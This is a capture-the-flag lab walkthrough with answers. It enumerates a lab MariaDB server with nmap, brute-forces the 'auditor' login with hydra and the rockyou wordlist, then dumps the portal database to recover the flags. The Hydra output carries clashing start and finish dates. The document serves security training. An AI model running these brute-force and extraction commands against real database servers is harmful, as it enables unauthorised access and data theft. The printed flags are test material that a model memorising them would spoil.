# CTF: SQL Database Basics

__MASTER HANDBOOK 2026.02__

DESCRIPTION: Database services frequently store sensitive business data, such as credentials, corporate secrets, and user PII. When exposed to the network or protected by weak passwords, attackers can gain direct access and extract large amounts of information.

In this challenge, you will enumerate a database service, perform a dictionary attack, and extract data using SQL queries.

DIFFICULTY: Novice

ESTIMATED TIME: 15 minutes

TARGET: database.corp.net (172.31.27.197)

OBJECTIVES:
+ Identify exposed database services and versions
+ Authenticate to the database server
+ Enumerate privileges, databases, and tables
+ Extract sensitive data using SQL commands

## PART 0x00 -- Service Discovery

Perform service enumeration to identify open ports and determine what database software is running.

_Questions:_
+ Which port(s) are open?
+ What database version is running?
+ When was this version released?

_Command:_

```
$ nmap --open -F -sV database.corp.net
```

_Expected Output:_

```
PORT     STATE SERVICE VERSION
3306/tcp open  mysql   MariaDB 5.5.5-10.11.15
```

_Service Version:_

```
MariaDB 10.11.15
```

_What does `5.5.5-` mean?_

"The version prefix (so called "replicated version hack") was introduced when MariaDB bumped the major version number to 10 (2 digits). This was necessary, since the replication protocol expects a 1-digit major version number and would break with a 2 digit version number. The version 5.5.5 was never released." ~~ [https://stackoverflow.com/questions/56601304/what-does-the-first-part-of-the-mariadb-version-string-mean]

_Release Date (yyyy-mm-dd):_

```
2025-11-07
```

~~ [https://mariadb.org/mariadb/all-releases]

## PART 0x01 -- Dictionary Attack

A leaked username is known: __auditor__.

Attempt a dictionary attack using the __ROCKYOU__ wordlist to determine the password for this account.

_Command(s):_

```
$ gunzip /usr/share/wordlists/rockyou.txt.gz
$ hydra -l auditor -P /usr/share/wordlists/rockyou.txt database.corp.net mysql
```

_Expected output:_

```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-02-26 17:11:35
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
[DATA] attacking mysql://database.corp.net:3306/
[3306][mysql] host: database.corp.net   login: auditor   password: iloveyou
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-01-23 17:11:37
```

_Flag\_01 (user:pass):_

```
auditor:iloveyou
```

## PART 0x02 -- Initial Access

Authenticate with the server and determine the current user's privileges.

_Question:_
+ What level of access does this account have?

_Commands:_

```
$ mysql --user=auditor --password=iloveyou --host=database.corp.net --skip-ssl
```

```
MariaDB [(none)]> SHOW GRANTS;
```

_Expected Output:_

```
+-----------------------------------------------------------------------------+
| Grants for auditor@172.31.27.%                                              |
+-----------------------------------------------------------------------------+
| GRANT USAGE ON *.* TO `auditor`@`172.31.27.%` IDENTIFIED BY PASSWORD '****' |
| GRANT SELECT ON `portal`.* TO `auditor`@`172.31.27.%`                       |
+-----------------------------------------------------------------------------+
2 rows in set (0.003 sec)
```

_Answer:_

The user `auditor` effectively has read-only access to the `portal` database.

## PART 0x03 -- Database Enumeration

Identify which database(s) are visible to the current account.

_Command(s):_

```
MariaDB [(none)]> SHOW DATABASES;
```

_Expected Output:_

```
+--------------------+
| Database           |
+--------------------+
| information_schema |
| portal             |
+--------------------+
2 rows in set (0.020 sec)
```

## PART 0x04 -- Table Enumeration

Select the database of interest and enumerate its tables.

_Command(s):_

```
MariaDB [(none)]> USE portal;
MariaDB [portal]> SHOW TABLES;
```

_Expected Output:_

```
+------------------+
| Tables_in_portal |
+------------------+
| messages         |
| notes            |
| users            |
+------------------+
3 rows in set (0.003 sec)
```

## PART 0x05 -- Data Extraction

Dump the tables and look for interesting information.

_Command(s):_

```
MariaDB [portal]> SELECT * FROM notes;
```

_Expected Output:_

```
+----+---------------------+--------+-----------------+--------------------------------------------------+
| id | created_at          | author | title           | body                                             |
+----+---------------------+--------+-----------------+--------------------------------------------------+
|  1 | 2026-02-02 18:54:28 | admin  | TODO            | Remember to remove test accounts before launch.  |
|  2 | 2026-02-02 18:54:28 | jdoe   | Onboarding      | WiFi creds are in the shared drive (not here).   |
|  3 | 2026-02-02 18:54:28 | asmith | Password Policy | Minimum 12 chars. No common words.               |
|  4 | 2026-02-02 18:54:28 | admin  | Migration Notes | Old portal import completed. Verify user tables. |
|  5 | 2026-02-02 18:54:28 | admin  | Do Not Share    | FLAG{prot3ct_y0ur_d@ta!}                         |
+----+---------------------+--------+-----------------+--------------------------------------------------+
5 rows in set (0.046 sec)
```

_Flag\_02:_

```
FLAG{prot3ct_y0ur_d@ta!}
```

----

EOF
